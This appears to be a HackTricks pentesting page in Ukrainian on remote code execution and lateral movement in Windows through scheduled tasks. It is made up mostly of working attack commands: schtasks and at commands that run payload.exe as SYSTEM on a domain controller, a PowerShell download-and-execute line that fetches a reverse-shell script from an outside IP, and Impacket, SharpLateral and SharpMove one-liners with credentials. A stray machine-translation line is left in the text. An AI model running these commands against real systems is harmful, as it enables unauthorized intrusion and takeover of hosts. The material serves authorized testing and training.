# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Як це працює

Маючи адміністративний доступ до Windows host, оператор може віддалено створити та запустити заплановане завдання. Опція `/S` вибирає віддалений host, `/U` і `/P` надають облікові дані для створення завдання за потреби, а `/RU` вибирає обліковий запис, від імені якого запускається завдання. Команда, на яку посилається `/TR`, має існувати у віддаленій системі.<sup>[[1]](#references)</sup>

Стара команда `at` також може запланувати виконання команди на віддаленому host, якщо працює служба Schedule. Вона виконує заплановані завдання від імені облікового запису служби, яким зазвичай є `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Створіть завдання, а потім запустіть його:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Надішліть текст, який потрібно перекласти.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Для регулярного щотижневого завдання використовуйте дійсний щотижневий розклад і явно вкажіть день:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Дія завдання також може безпосередньо запускати PowerShell. Наведений нижче лабораторний приклад завантажує та запускає script; розміщуйте payload лише на інфраструктурі, авторизованій для assessment:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket's `atexec.py` автоматизує віддалене виконання команд через службу Task Scheduler і підтримує автентифікацію за паролем, NTLM-хешем або Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral надає метод виконання scheduled task:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove надає ще одну реалізацію Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Більше інформації про [**використання schtasks із silver tickets тут**](../active-directory-methodology/silver-ticket.md#host).

Видаляйте тестові завдання після використання:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - створення schtasks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - команда `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
